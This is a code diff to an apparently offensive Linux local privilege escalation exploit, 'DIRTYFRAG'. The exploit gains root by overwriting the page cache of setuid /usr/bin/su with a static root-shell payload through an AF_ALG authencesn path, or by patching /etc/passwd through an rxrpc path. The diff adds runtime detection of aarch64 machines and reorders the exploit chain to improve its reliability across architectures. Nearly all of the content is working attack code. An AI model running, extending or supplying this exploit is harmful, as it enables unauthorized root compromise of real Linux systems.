@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
+#include <sys/utsname.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include <errno.h>
@@ -290,11 +291,6 @@ static int verify_byte(const char *path, off_t offset, uint8_t want)
 
 static int corrupt_su(void)
 {
-#if defined(__aarch64__)
-	SLOG("xfrm /usr/bin/su payload is x86_64-only; skipping on aarch64 and using rxrpc path");
-	errno = ENOTSUP;
-	return -1;
-#else
 	setup_userns_netns();
 	usleep(100 * 1000);
 
@@ -325,7 +321,6 @@ static int corrupt_su(void)
 	SLOG("wrote %d bytes to %s starting at 0x%x",
 			PAYLOAD_LEN, TARGET_PATH, PATCH_OFFSET);
 	return 0;
-#endif
 }
 
 int su_lpe_main(int argc, char **argv)
@@ -1647,9 +1642,7 @@ int rxrpc_lpe_main(int argc, char **argv)
  *
  * 1. ESP path  (authencesn AF_ALG --corrupt-only): overwrites the first
  *    160 bytes of /usr/bin/su's page-cache with a static x86_64 root-
- *    shell ELF. On aarch64 builds this step is skipped automatically and
- *    the chain uses the rxrpc path directly. Works on every distro tested
- *    regardless of PAM nullok
+ *    shell ELF.  Works on every distro tested regardless of PAM nullok
  *    or /etc/passwd contents — once invoked, the patched setuid-root
  *    /usr/bin/su just execs /bin/sh as uid 0.
  *
@@ -1698,12 +1691,7 @@ extern int rxrpc_lpe_main(int argc, char **argv);
  * magic there — both before and after we patch.)
  */
 static const uint8_t su_marker[8] = {
-#if defined(__aarch64__)
-	/* No aarch64 /usr/bin/su patch payload yet; keep a marker that never matches. */
-	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-#else
 	0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
-#endif
 };
 
 static int su_already_patched(void)
@@ -1905,10 +1893,20 @@ static int run_root_pty(void)
 	return 0;
 }
 
+
+static int runtime_is_aarch64(void)
+{
+	struct utsname u;
+	if (uname(&u) != 0)
+		return 0;
+	return strcmp(u.machine, "aarch64") == 0 || strcmp(u.machine, "arm64") == 0;
+}
+
 int main(int argc, char **argv)
 {
 	int verbose = (getenv("DIRTYFRAG_VERBOSE") != NULL);
 	int force_esp = 0, force_rxrpc = 0;
+	int is_aarch64 = runtime_is_aarch64();
 	int saved_err = -1;
 	int rc = 1;
 	int new_argc;
@@ -1941,11 +1939,19 @@ int main(int argc, char **argv)
 	} else if (force_esp) {
 		rc = su_lpe_main(new_argc, co_argv);
 	} else {
-		rc = su_lpe_main(new_argc, co_argv);
-		if (!su_already_patched()) {
+		if (is_aarch64) {
 			rc = rxrpc_lpe_main(new_argc, co_argv);
 			for (int i = 0; !passwd_already_patched() && i < 3; i++)
 				rc = rxrpc_lpe_main(new_argc, co_argv);
+			if (!passwd_already_patched())
+				rc = su_lpe_main(new_argc, co_argv);
+		} else {
+			rc = su_lpe_main(new_argc, co_argv);
+			if (!su_already_patched()) {
+				rc = rxrpc_lpe_main(new_argc, co_argv);
+				for (int i = 0; !passwd_already_patched() && i < 3; i++)
+					rc = rxrpc_lpe_main(new_argc, co_argv);
+			}
 		}
 	}
 
